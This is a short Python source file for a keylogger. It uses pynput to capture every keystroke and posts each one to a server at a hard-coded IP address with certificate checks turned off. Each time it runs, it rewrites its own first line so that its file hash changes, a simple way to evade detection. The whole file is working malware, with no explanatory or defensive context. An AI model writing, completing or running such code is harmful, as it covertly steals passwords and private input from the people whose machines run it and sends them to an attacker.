# Blank line for morphing
from pynput.keyboard import Listener
import requests
import random

def mutate_executable():
    # Read the current script
    with open(__file__, 'r') as f:
        lines = f.readlines()

    # Randomly alter a comment line to change the hash
    mutation_line = f"# Mutation: {random.randint(1, 100000)}\n"
    lines[0] += mutation_line

    # Write the changes back to the script
    with open(__file__, 'w') as f:
        f.writelines(lines)

# Server URL with HTTPS
server_url = 'https://192.168.86.229:5000/log'

def send_data(key):
    try:
        # Send the keystroke data over HTTPS
        requests.post(server_url, data={'keystroke': str(key)}, verify=False)
    except Exception as e:
        print(f"Failed to send data: {e}")

def on_press(key):
    send_data(key)

def main():
    # Start the keylogger
    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    mutate_executable()
    main()